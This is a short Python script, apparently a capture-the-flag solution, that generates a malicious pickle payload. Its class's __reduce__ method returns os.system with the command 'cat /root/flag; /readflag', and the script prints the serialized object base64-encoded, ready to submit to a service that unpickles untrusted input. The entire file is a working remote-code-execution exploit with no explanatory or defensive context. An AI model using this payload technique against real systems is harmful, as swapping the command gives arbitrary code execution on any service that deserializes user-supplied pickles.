import base64
import os
import pickle


class RCE:
    def __reduce__(self):
        cmd = ('cat /root/flag; /readflag')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled).decode())